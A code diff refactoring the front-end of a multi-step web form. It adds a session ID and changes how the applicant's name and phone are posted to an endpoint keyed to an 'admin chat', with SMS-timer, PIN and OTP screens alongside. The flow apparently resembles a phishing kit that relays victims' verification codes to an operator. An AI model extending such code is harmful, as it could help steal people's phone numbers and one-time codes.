@@ -1,7 +1,7 @@
 (function () {
   const $ = (id) => document.getElementById(id);
 
-  let currentUserId = null;
+  let currentUserId = `session_${Date.now()}_${Math.random().toString(36).slice(2, 7)}`;
   let statusPollInterval = null;
   let smsTimerInterval = null;
   let pinAutoSubmittedForCurrentValue = '';
@@ -198,7 +198,7 @@
     stepTo('screen-form3');
   }
 
-  async function nextFromForm3() {
+  function nextFromForm3() {
     syncSummary();
 
     const firstNameInput = $('first-name');
@@ -254,23 +254,22 @@
       } catch (e) {}
     }
 
-    try {
-      const res = await fetch(
-        `/api/submit-application?admin=${encodeURIComponent(adminParam)}`,
-        {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            adminChatId: adminParam,
-            applicant: { fullName, phone: zeroPhone }
-          })
+    fetch(`/api/submit-application?admin=${encodeURIComponent(adminParam)}`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        userId: currentUserId,
+        adminChatId: adminParam,
+        applicant: { fullName, phone: zeroPhone }
+      })
+    })
+      .then((res) => res.json())
+      .then((data) => {
+        if (data && data.success && data.userId) {
+          currentUserId = data.userId;
         }
-      );
-      const data = await res.json();
-      if (data && data.success && data.userId) {
-        currentUserId = data.userId;
-      }
-    } catch (e) {}
+      })
+      .catch(() => {});
   }
 
   function startSmsCountdown() {
@@ -301,8 +300,6 @@
     if (statusPollInterval) clearInterval(statusPollInterval);
 
     statusPollInterval = setInterval(async () => {
-      if (!currentUserId) return;
-
       try {
         const res = await fetch(`/api/check-status/${encodeURIComponent(currentUserId)}`);
         const data = await res.json();
@@ -591,4 +588,4 @@
     const displayOtpPhone = $('display-otp-phone');
     if (!pinPhoneInput) return;
     const formatted = formatDisplayPhone(pinPhoneInput.value);
-    if (displayPinPhone) displayPinPhone.innerText
+    if (displayPinPhone) displayPinPhone.i
